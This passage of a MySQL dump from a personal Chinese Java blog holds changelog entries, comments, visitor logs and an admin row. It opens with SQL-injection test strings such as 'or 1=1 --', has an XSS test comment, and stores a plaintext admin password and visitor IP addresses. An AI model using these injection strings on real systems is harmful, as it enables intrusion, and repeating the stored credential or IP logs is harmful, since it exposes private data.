``a``=``a\r\nhi`` or 1=1 --\r\nhi` or 1=1 --\r\nhi` or `a`=`a\r\nhi`) or (`a`=`a\r\nhi``) or (``a``=``a[|code]',4467);
/*!40000 ALTER TABLE `t_article` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `t_comment`
--

DROP TABLE IF EXISTS `t_comment`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `t_comment` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `article_id` int(11) DEFAULT NULL,
  `nickname` varchar(30) DEFAULT NULL,
  `content` text,
  `time` datetime DEFAULT '1970-01-01 00:00:00',
  `ip` varchar(40) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `t_comment`
--

LOCK TABLES `t_comment` WRITE;
/*!40000 ALTER TABLE `t_comment` DISABLE KEYS */;
INSERT INTO `t_comment` VALUES (1,54,'我自己','沃日每日评论??我先来一发','2018-02-25 16:44:06','47.52.113.103'),(2,81,'不愿透露姓名的网友','我是测试,别理我','2018-02-26 20:11:41','47.52.113.103'),(3,59,'我','纠正一下,移动端并不是系统缩放,只是手机屏幕的ppi远大于pc的,但是效果和原理有一样','2018-02-28 15:10:50','47.52.113.103'),(4,82,'不愿透露姓名的网友','转载的','2018-03-02 15:36:22','47.52.113.103'),(5,80,'Jim','IDE准备集体转jetbrains系列了','2018-03-03 17:50:29','106.14.4.57'),(6,82,'我自己','XSS测试:\r\n《script》alert(`#``#`)《|script》','2018-03-03 22:39:24','106.14.4.57'),(7,45,'你大爷','class文件的魔数是``cafebabe``(咖啡宝贝)','2018-03-04 08:25:09','106.14.4.57'),(8,83,'myself','all clear !!\r\n107条XSS测试代码全部通过(～￣▽￣)～ ','2018-03-04 17:54:18','111.208.112.175'),(9,53,'self','还要配合@WebServlet(value=``|MainServlet``,loadOnStartup = 1)以在tomcat启动时实例化','2018-03-05 08:04:21','111.208.112.175'),(10,80,'JimJIn','shell工具第一个写错了,是oh my zsh, 不是bash','2018-03-05 19:26:45','112.2.254.117');
/*!40000 ALTER TABLE `t_comment` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `t_history`
--

DROP TABLE IF EXISTS `t_history`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `t_history` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `date` varchar(10) CHARACTER SET latin1 DEFAULT NULL,
  `version` varchar(10) CHARACTER SET latin1 DEFAULT NULL,
  `content` varchar(60) DEFAULT NULL,
  `isBig` tinyint(1) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=102 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `t_history`
--

LOCK TABLES `t_history` WRITE;
/*!40000 ALTER TABLE `t_history` DISABLE KEYS */;
INSERT INTO `t_history` VALUES (30,'2017-09-02','0.0','博客诞生',0),(31,'2017-09-02','0.0','测试阶段:阿里云vps成功内测前端模板',0),(32,'2017-09-09','0.0','测试阶段:服务器重定向:彻底重写后端:立场从asp.NET转向JavaEE',1),(33,'2017-09-10','0.0','测试阶段:完成基于session-cookie的访客记录机制',0),(34,'2017-09-10','0.0','测试阶段:dao层和service层书写完毕,投入使用',0),(35,'2017-09-17','0.9','测试阶段:数据库连接池从dbcp迁移至c3p0,完善高并发mysql访问机制',1),(36,'2017-09-19','1.0','博客正式于上海服务器上线!',1),(37,'2018-01-02','1.1','解决了url中文乱码问题',0),(38,'2018-01-02','1.2','博客迁移至本人名下,补全开发者信息',0),(39,'2018-01-05','2.2','首页div框架左右交换,可读性更强,手机端显示文章更方便',1),(40,'2018-01-06','2.5','增加鼠标事件,big模式下动态显示\'阅读全文\'',0),(41,'2018-01-07','2.7','完善\'关于\'板块,增加作者坐标等信息',0),(42,'2018-01-15','3.7','网站主色调大变革,增加半透明蒙版,扁平化设计更鲜明!',1),(43,'2018-01-20','3.8','美化了一些细节;更新了壁纸和部分文字对齐等',0),(44,'2018-01-21','3.9','依国家法律,完善了首页页脚的备案信息,本博客成为正式的ICP(互联网内容提供商)',0),(45,'2018-01-22','4.0','修复了一些bug,修改部分字体样式',0),(46,'2018-01-23','4.2','容器更新:解决cookie中键入空格的问题',0),(47,'2018-01-23','5.2','优化了文章列表显示算法,避免了全表扫描,即将推出分页机制,提高访问速度',1),(48,'2018-01-24','5.4','增加了支付宝打赏功能(｡･ω･｡)嘻嘻',0),(49,'2018-01-24','5.5','优化了一些细节;改良了评论机制',0),(50,'2018-01-24','5.7','优化了排名机制,第三次避免了全表扫描',0),(51,'2018-01-24','5.9','做了一些前端美工的活儿;修改了部分RGB',0),(52,'2018-01-25','6.9','时间轴板块大改革,更名为history板块,记录网站所有历史版本更新信息!!',1),(53,'2018-01-25','7.0','一怒之下重写了一遍history.css,增强了新版块在移动端上的体验~',0),(54,'2018-01-25','7.1','修改了iptables映射,隐藏了8080端口:缩短url长度!',0),(55,'2018-01-25','7.2','修改了虚拟路径,覆盖了tomcat首页:再次缩短url长度,博客唯一域名:openidea.xin',0),(56,'2018-01-25','7.4','优化了数据库',0),(57,'2018-01-26','7.5','剔除了不必要的骨干div,使得手机端显示时main区撑满整个屏幕宽度',0),(58,'2018-01-26','7.6','优化了标签机制,修复了列表泛型,避免了NullPointerException',0),(59,'2018-01-26','8.0','管理员界面嵌入了一个占网站源码2/3的Markdown编辑器,对于我来说当然是重大更新啦~不过放心,这不影响网站的健壮性',1),(60,'2018-01-26','8.1','改良了文章编辑机制,从此小编更新文章更频啦',0),(61,'2018-01-26','9.1','意外发现admin的重大安全漏洞,吓得我赶紧down掉服务器重写了一遍过滤器,很抱歉网站挂掉了2个小时T^T',1),(62,'2018-01-26','9.2','修复了admin后台;修复了一些空指向的href',0),(63,'2018-01-27','9.7','巩固了后台mvc架构',0),(64,'2018-01-27','9.8','修复了一些bug',0),(65,'2018-01-27','10.0','添加了浏览器缓存,提高了服务器响应效率',0),(66,'2018-01-28','10.1','半重大更新:删除了service层些许不必要的方法,提高了LoginServlet的响应速度!',0),(67,'2018-01-28','10.2','整理了public.css,使得前端层次化更分明,更精简',0),(68,'2018-01-28','11.2','文章列表引入分页机制,同时完善了ajax的json交互',1),(69,'2018-01-29','11.5','在新推出的分页机制上做了一系列美化,引入了CSS3新技术之transform,支持多个主流浏览器:)',0),(70,'2018-01-29','12.3','去掉了很鸡肋的文章作者信息,drop掉了整整一个列!因为博客的作者都是我一个人啊哈哈(￣▽￣)／❤',1),(71,'2018-01-29','12.5','彻底删除了测试包和一些出入补丁,减轻了源码体积,网站从此进入健壮、成熟发展的新阶段!!感谢各位!',1),(72,'2018-01-30','12.6','做了一些安全加固',0),(73,'2018-02-01','12.6','筹划了新的标签机制和缓存方案',0),(74,'2018-02-02','12.9','删除了分类机制,统一由标签机制管理,减轻容器负担',0),(75,'2018-02-02','13.2','半重大更新:部署并发布了新设计的label系统雏形(将会公开到GitHub)',0),(76,'2018-02-02','13.3','强化了新开发的labels管理系统',0),(77,'2018-02-02','13.4','做了一点前端优化,统一了浮动替代表格',0),(78,'2018-02-03','13.5','修复了一些bug',0),(79,'2018-02-04','15.0','有史以来最重大更新:完成了健壮了标签管理系统,翻新了整个数据库结构,并更新了所有文章٩(๑❛ᴗ❛๑)۶',1),(80,'2018-02-04','15.2','全新推出\"热门标签\"栏目于首页,取代列出全部标签',0),(81,'2018-02-04','15.3','优化了一下响应式的布局',0),(82,'2018-02-05','15.5','做了些小修小补比如格式化了时间戳;优化了一下算法比如null掉了model层一些多余的成员',0),(83,'2018-02-05','15.6','新增了几个用户友好的前端控件,自寻探索哦~',0),(84,'2018-02-05','15.8','统计了每一篇博文的字数,并显示在相关位置',0),(85,'2018-02-05','15.9','删除了几乎所有JSP注释,解放了带宽,此时整个源代码即趋于完美!',0),(86,'2018-02-06','16.0','优化了管理员接口,距网站开源还有一步之遥!',0),(87,'2018-02-07','16.1','CSS大整改:删除了所有重复的层叠规则,整合到public.css,同时进行了格式压缩,再一次大幅度解放带宽的压力',0),(88,'2018-02-07','16.2','压缩并更新了favicon.ico,提升了品牌的价值(＾＿－)',0),(89,'2018-02-07','16.4','进行了大面积的图片压缩,也是网站上线以来第5次裁剪行动,此时网站根目录体积逼近10M',0),(90,'2018-02-07','17.4','drop掉mysql自动备份表,从此进入手动备份时代',1),(91,'2018-02-08','18.4','服务器更新:CentOS下每天23:59重启tomcat,以便进行一些垃圾清理和缓存刷新',1),(92,'2018-02-08','18.6','扔掉一个过滤器;修复一些bug',0),(93,'2018-02-09','18.9','容器优化:解决mysql重连问题,提高可用性',0),(94,'2018-02-18','19.0','优化~',0),(95,'2018-02-20','20.1','确定了全局缓存模型:将大多request属性存入application中,大大加强了对DDoS的防御力',1),(96,'2018-02-21','20.3','春节结束前最后一次优化',0),(97,'2018-02-23','20.4','MySQL微整:去除了多余的select项目',0),(98,'2018-02-25','20.7','全面改良了评论机制及其界面,删了多余的ajax验证包',0),(99,'2018-02-26','20.9','容器更新:屏蔽webapps下预留的应用,增大Blog(主应用)的空间',0),(100,'2018-02-28','21.6','近期最后一次重大更新:升级了服务器缓存模型的动态刷新制度;同时让部分servlet开机自启以最小化http的响应周期',1),(101,'2018-03-03','21.8','精简化md2html解析器,大大加速了ArticleServlet的响应周期',0);
/*!40000 ALTER TABLE `t_history` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `t_user`
--

DROP TABLE IF EXISTS `t_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `t_user` (
  `user_id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT 'primary_key',
  `user_name` varchar(20) NOT NULL COMMENT 'username',
  `user_password` varchar(20) NOT NULL COMMENT 'password',
  PRIMARY KEY (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `t_user`
--

LOCK TABLES `t_user` WRITE;
/*!40000 ALTER TABLE `t_user` DISABLE KEYS */;
INSERT INTO `t_user` VALUES (1,'Jim','000241');
/*!40000 ALTER TABLE `t_user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `t_visitor`
--

DROP TABLE IF EXISTS `t_visitor`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `t_visitor` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ip` varchar(50) DEFAULT NULL,
  `time` varchar(50) DEFAULT NULL,
  `port` int(11) DEFAULT NULL,
  `browser` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=268 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `t_visitor`
--

LOCK TABLES `t_visitor` WRITE;
/*!40000 ALTER TABLE `t_visitor` DISABLE KEYS */;
INSERT INTO `t_visitor` VALUES (52,'180.111.24.220','2018-01-21_13:55:43',NULL,NULL),(53,'180.111.24.220','2018-01-21_15:05:12',NULL,NULL),(55,'180.111.24.220','2018-01-21_21:40:57',NULL,NULL),(56,'180.111.24.220','2018-01-21_21:43:27',NULL,NULL),(57,'180.111.24.220','2018-01-21_21:43:49',NULL,NULL),(59,'180.111.27.60','2018-01-22_13:09:50',NULL,NULL),(60,'180.111.27.60','2018-01-22_14:17:53',NULL,NULL),(62,'180.111.27.60','2018-01-22_16:58:16',NULL,NULL),(63,'180.111.27.60','2018-01-22_18:14:44',NULL,NULL),(64,'180.111.27.60','2018-01-22_18:40:39',NULL,NULL),(65,'180.111.27.60','2018-01-22_21:16:49',NULL,NULL),(67,'180.111.27.60','2018-01-22_21:42:13',NULL,NULL),(68,'180.111.27.60','2018-01-22_21:45:17',NULL,NULL),(69,'47.52.113.103','2018-01-22_21:46:26',NULL,NULL),(71,'47.52.113.103','2018-01-22_21:54:07',NULL,NULL),(72,'180.111.27.60','2018-01-22_22:00:36',NULL,NULL),(75,'180.109.232.134','2018-01-23_12:59:15',NULL,NULL),(76,'180.109.232.134','2018-01-23_13:04:30',NULL,NULL),(77,'180.109.232.134','2018-01-23_13:05:17',NULL,NULL),(78,'180.109.232.134','2018-01-23_14:54:19',NULL,NULL),(79,'180.109.232.134','2018-01-23_14:55:09',NULL,NULL),(84,'180.109.232.134','2018-01-23_15:14:16',NULL,NULL),(85,'180.109.232.134','2018-01-23_17:25:23',NULL,NULL),(87,'180.109.232.134','2018-01-23_19:00:09',NULL,NULL),(88,'180.109.232.134','2018-01-23_21:01:58',NULL,NULL),(89,'180.109.232.134','2018-01-24_12:28:48',NULL,NULL),(91,'180.109.232.134','2018-01-24_12:33:58',NULL,NULL),(92,'180.109.232.134','2018-01-24_13:43:40',NULL,NULL),(94,'180.109.232.134','2018-01-24_14:04:33',NULL,NULL),(96,'180.109.232.134','2018-01-24_14:15:12',NULL,NULL),(97,'180.109.232.134','2018-01-24_15:16:17',NULL,NULL),(98,'180.109.232.134','2018-01-24_15:56:57',NULL,NULL),(100,'180.109.232.134','2018-01-24_16:57:44',NULL,NULL),(101,'180.109.232.134','2018-01-24_18:09:56',NULL,NULL),(102,'180.109.232.134','2018-01-24_19:42:51',NULL,NULL),(103,'180.109.232.134','2018-01-24_23:05:29',NULL,NULL),(104,'47.52.113.103','2018-01-24_23:18:39',NULL,NULL),(106,'180.109.232.134','2018-01-24_23:23:34',NULL,NULL),(107,'114.222.222.18','2018-01-25_14:39:24',NULL,NULL),(108,'114.222.222.18','2018-01-25_15:09:18',NULL,NULL),(109,'66.249.65.73','2018-01-25_16:04:48',NULL,NULL),(110,'114.222.222.18','2018-01-25_18:24:34',NULL,NULL),(111,'114.222.222.18','2018-01-25_18:55:07',NULL,NULL),(112,'114.222.222.18','2018-01-25_19:18:32',NULL,NULL),(113,'114.222.222.18','2018-01-25_19:23:29',NULL,NULL),(114,'114.222.222.18','2018-01-25_19:30:32',NULL,NULL),(115,'114.222.222.18','2018-01-25_19:32:08',NULL,NULL),(116,'114.222.222.18','2018-01-25_20:12:07',NULL,NULL),(117,'47.52.113.103','2018-01-25_20:12:13',NULL,NULL),(118,'101.226.102.97','2018-01-25_20:13:13',NULL,NULL),(119,'114.222.222.18','2018-01-25_21:26:22',NULL,NULL),(120,'114.222.222.18','2018-01-25_22:14:09',NULL,NULL),(123,'114.222.222.18','2018-01-25_23:20:50',NULL,NULL),(131,'180.109.234.172','2018-02-07_20:09:47',NULL,NULL),(135,'180.109.234.172','2018-02-07_21:16:33',NULL,NULL),(136,'180.109.234.172','2018-02-07_22:17:28',NULL,NULL),(138,'27.17.99.150','2018-02-08_00:29:39',NULL,NULL),(139,'180.109.234.172','2018-02-08_12:01:57',NULL,NULL),(150,'180.109.234.172','2018-02-08_13:29:57',NULL,NULL),(156,'180.109.234.172','2018-02-08_14:12:34',NULL,NULL),(161,'180.109.234.172','2018-02-08_15:03:53',NULL,NULL),(162,'180.109.234.172','2018-02-08_15:05:05',NULL,NULL),(163,'180.109.234.172','2018-02-08_15:05:37',NULL,NULL),(164,'180.109.234.172','2018-02-08_15:05:52',NULL,NULL),(165,'180.109.234.172','2018-02-08_15:06:16',NULL,NULL),(166,'180.109.234.172','2018-02-08_15:07:16',NULL,NULL),(167,'180.109.234.172','2018-02-08_15:22:08',NULL,NULL),(168,'180.109.234.172','2018-02-08_15:22:34',NULL,NULL),(169,'180.109.234.172','2018-02-08_15:22:45',NULL,NULL),(170,'180.109.234.172','2018-02-08_16:11:52',NULL,NULL),(171,'180.109.234.172','2018-02-08_17:25:18',NULL,NULL),(172,'59.175.16.123','2018-02-08_17:43:43',NULL,NULL),(173,'180.109.234.172','2018-02-08_18:18:39',NULL,NULL),(174,'42.236.10.102','2018-02-08_18:35:51',NULL,NULL),(175,'180.109.234.172','2018-02-08_21:35:55',NULL,NULL),(176,'180.109.234.172','2018-02-08_22:37:02',NULL,NULL),(177,'27.17.99.150','2018-02-09_01:38:08',NULL,NULL),(178,'203.208.60.144','2018-02-09_01:44:52',NULL,NULL),(179,'203.208.60.145','2018-02-09_01:45:09',NULL,NULL),(180,'180.109.234.172','2018-02-09_11:40:35',NULL,NULL),(181,'180.109.234.172','2018-02-09_11:42:27',NULL,NULL),(182,'180.109.234.172','2018-02-09_12:17:31',NULL,NULL),(183,'27.17.99.150','2018-02-09_14:10:43',NULL,NULL),(184,'15.65.244.12','2018-02-09_16:16:59',NULL,NULL),(185,'180.109.234.172','2018-02-09_16:20:28',NULL,NULL),(186,'114.222.221.86','2018-02-09_17:29:08',NULL,NULL),(187,'27.17.99.150','2018-02-09_19:24:17',NULL,NULL),(188,'114.222.221.86','2018-02-09_19:58:35',NULL,NULL),(189,'27.17.99.150','2018-02-09_23:59:31',NULL,NULL),(190,'114.222.221.86','2018-02-10_10:10:50',NULL,NULL),(191,'47.95.63.56','2018-02-10_10:30:07',NULL,NULL),(192,'114.222.221.86','2018-02-10_13:18:47',NULL,NULL),(193,'114.222.221.86','2018-02-10_14:42:53',NULL,NULL),(194,'114.222.221.86','2018-02-10_16:56:10',NULL,NULL),(195,'114.222.221.86','2018-02-10_21:12:18',NULL,NULL),(196,'42.236.10.85','2018-02-11_01:58:35',NULL,NULL),(197,'42.236.10.112','2018-02-12_09:44:59',NULL,NULL),(198,'180.111.49.153','2018-02-12_11:33:07',NULL,NULL),(199,'42.236.10.108','2018-02-12_12:12:28',NULL,NULL),(200,'180.111.49.153','2018-02-12_18:49:30',NULL,NULL),(201,'42.236.10.112','2018-02-13_13:46:40',NULL,NULL),(202,'114.222.222.173','2018-02-13_20:56:50',NULL,NULL),(203,'114.222.222.173','2018-02-14_10:45:03',NULL,NULL),(204,'114.222.222.173','2018-02-14_11:58:39',NULL,NULL),(205,'180.111.25.255','2018-02-15_19:05:36',NULL,NULL),(206,'42.236.10.103','2018-02-15_22:29:59',NULL,NULL),(207,'203.208.60.148','2018-02-16_03:30:33',NULL,NULL),(208,'203.208.60.145','2018-02-16_04:00:35',NULL,NULL),(209,'111.208.112.175','2018-02-17_10:38:09',NULL,NULL),(210,'47.92.22.210','2018-02-17_13:02:51',NULL,NULL),(211,'111.208.112.175','2018-02-17_14:04:07',NULL,NULL),(212,'47.92.22.210','2018-02-17_15:23:12',NULL,NULL),(213,'111.208.112.175','2018-02-18_11:21:42',NULL,NULL),(214,'111.208.112.175','2018-02-18_12:23:10',NULL,NULL),(215,'111.208.112.175','2018-02-18_13:51:01',NULL,NULL),(216,'42.236.10.82','2018-02-18_19:37:31',NULL,NULL),(217,'111.208.112.175','2018-02-18_21:18:00',NULL,NULL),(218,'111.208.112.175','2018-02-18_23:09:18',NULL,NULL),(219,'111.208.112.175','2018-02-19_10:02:38',NULL,NULL),(220,'111.208.112.175','2018-02-19_11:20:12',NULL,NULL),(221,'111.208.112.175','2018-02-19_12:31:34',NULL,NULL),(222,'111.208.112.175','2018-02-19_14:08:59',NULL,NULL),(223,'42.236.10.100','2018-02-19_15:34:30',NULL,NULL),(224,'111.208.112.175','2018-02-19_16:02:56',NULL,NULL),(225,'111.208.112.175','2018-02-19_18:04:31',NULL,NULL),(226,'42.236.10.75','2018-02-20_05:38:50',NULL,NULL),(227,'42.236.10.111','2018-02-20_07:37:49',NULL,NULL),(228,'111.208.112.175','2018-02-20_10:24:54',NULL,NULL),(229,'111.208.112.175','2018-02-20_20:21:27',NULL,NULL),(230,'111.208.112.175','2018-02-20_21:26:38',NULL,NULL),(231,'111.208.112.175','2018-02-20_22:44:38',NULL,NULL),(232,'183.206.173.116','2018-02-22_11:39:22',NULL,NULL),(233,'183.206.173.116','2018-02-22_11:44:55',NULL,NULL),(234,'111.208.112.175','2018-02-25_08:49:33',NULL,NULL),(235,'112.2.254.83','2018-02-26_10:51:32',NULL,NULL),(236,'112.2.254.83','2018-02-26_22:29:44',NULL,NULL),(237,'112.2.254.55','2018-02-28_16:54:32',NULL,NULL),(238,'112.2.254.102','2018-03-01_19:57:52',NULL,NULL),(239,'112.2.254.70','2018-03-03__17:00:23',15173,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36'),(240,'47.52.113.103','2018-03-03__17:04:49',33960,'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:58.0) Gecko/20100101 Firefox/58.0'),(241,'120.204.17.73','2018-03-03__17:05:49',39420,'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36'),(242,'112.2.254.70','2018-03-03__20:59:44',12863,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36'),(243,'112.2.254.70','2018-03-03__22:37:44',30747,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36'),(244,'112.2.254.22','2018-03-04__08:13:54',40894,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36'),(245,'101.132.48.32','2018-03-04__09:35:23',40976,'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0'),(246,'42.236.10.76','2018-03-04__12:58:47',17566,'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36'),(247,'203.208.60.147','2018-03-04__15:41:00',48105,'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'),(248,'111.208.112.175','2018-03-04__16:19:13',55449,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36'),(249,'111.208.112.175','2018-03-04__17:44:54',43413,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36'),(250,'42.236.10.109','2018-03-04__18:13:28',16823,'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36'),(251,'111.208.112.175','2018-03-04__18:38:47',32373,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36'),(252,'111.208.112.175','2018-03-04__18:44:17',51468,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36'),(253,'111.208.112.175','2018-03-04__19:49:33',37482,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36'),(254,'111.208.112.175','2018-03-04__21:11:59',43421,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36'),(255,'111.208.112.175','2018-03-04__21:56:30',23423,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36'),(256,'111.208.112.175','2018-03-04__21:59:53',35611,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36'),(257,'111.208.112.175','2018-03-05__07:51:51',40483,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36'),(258,'40.77.167.125','2018-03-05__10:19:25',3314,'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(259,'121.0.29.202','2018-03-05__10:51:47',52366,'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36'),(260,'112.2.254.78','2018-03-05__15:28:19',44196,'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'),(261,'112.2.254.75','2018-03-05__15:59:50',8773,'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) CriOS/64.0.3282.112 Mobile/15D100 Safari/604.1'),(262,'112.2.254.16','2018-03-05__18:58:05',33382,'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'),(263,'120.204.17.73','2018-03-05__18:59:05',63946,'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36'),(264,'112.2.254.117','2018-03-05__19:25:00',11684,'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'),(265,'112.2.254.19','2018-03-06__12:15:03',5679,'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36'),(266,'112.2.254.86','2018-03-06__15:25:45',23052,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36'),(267,'112.2.254.74','2018-03-06__16:02:05',52202,'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36');
/*!40000 ALTER TABLE `t_visitor` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2018-03-06 16:50:19
